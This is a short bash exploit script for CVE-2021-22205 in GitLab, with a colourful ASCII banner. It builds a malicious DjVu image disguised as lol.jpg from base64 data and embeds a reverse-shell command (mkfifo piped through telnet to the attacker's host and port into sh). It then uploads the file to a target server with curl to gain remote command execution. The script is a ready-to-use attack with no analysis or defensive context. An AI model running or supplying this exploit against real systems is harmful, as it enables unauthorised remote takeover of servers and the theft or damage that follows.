#!/usr/bin/bash
#CVE: CVE-2021-22205

echo -e '\E[31;40m'" _____ _____  _____    ______ _____   ___  ___  _   _ _   _ "
echo -e '\E[32;40m'"|  _  |  __ \/  __ \   |  _  \  ___| |_  |/ _ \| | | | | | |"
echo -e '\E[33;40m'"| | | | |  \/| /  \/   | | | | |__     | / /_\ \ | | | | | |"
echo -e '\E[34;40m'"| | | | | __ | |       | | | |  __|    | |  _  | | | | | | |"
echo -e '\E[35;40m'"\ \_/ / |_\ \| \__/\   | |/ /| |___/\__/ / | | \ \_/ / |_| |"
echo -e '\E[36;40m'" \___/ \____/ \____/   |___/ \____/\____/\_| |_/\___/ \___/ "
echo -e '\E[37;40m'"                                                            ";tput sgr0

TF=$(mktemp -u)

echo -e '\E[31;40m' "LHOST?"; tput sgr0
read LHOST
echo -e '\E[31;40m' "LPORT?"; tput sgr0
read LPORT
echo -e '\E[31;40m' "RHOST?"; tput sgr0
read RHOST
echo -e '\E[31;40m' "RPORT?"; tput sgr0
read RPORT

echo -e '\E[31;40m'"Making lol.jpg file"
echo -e 'QVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHs=' | base64 -d > lol.jpg
echo -n "mkfifo $TF && telnet $LHOST $LPORT 0<$TF | sh 1>$TF" >> lol.jpg
echo -n "fSAuIFwKIiBiICIpICkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==" | base64 -d >> lol.jpg
tput sgr0

read -p "Start listener on $LHOST with port $LPORT, press enter when ready"
curl -v -F 'file=@lol.jpg' "http://$RHOST:$RPORT/$(openssl rand -hex 8)"
